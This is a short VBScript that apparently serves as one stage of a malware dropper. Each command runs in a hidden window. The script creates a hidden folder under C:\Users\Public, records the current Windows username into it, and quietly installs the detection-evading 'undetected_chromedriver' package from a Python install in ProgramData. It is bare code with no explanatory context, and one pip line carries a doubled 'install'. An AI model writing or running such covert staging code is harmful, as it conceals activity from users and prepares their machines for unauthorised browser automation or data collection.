WScript.Sleep(2000)
Set sort = WScript.CreateObject("WScript.Shell")
sort.Run("powershell.exe New-Item -Path 'C:\Users\Public\yt\' -ItemType Directory"), 0, True
WScript.Sleep(2000)
sort.Run("C:\Windows\System32\attrib.exe +h C:\Users\Public\yt"), 0, True
WScript.Sleep(2000)
sort.Run("powershell.exe [Environment]::UserName >C:\Users\Public\yt\name.txt"), 0, True
WScript.Sleep(2000)
sort.Run("C:\ProgramData\python310\Scripts\pip.exe install install undetected_chromedriver --quiet"), 0, True
WScript.Sleep(2000)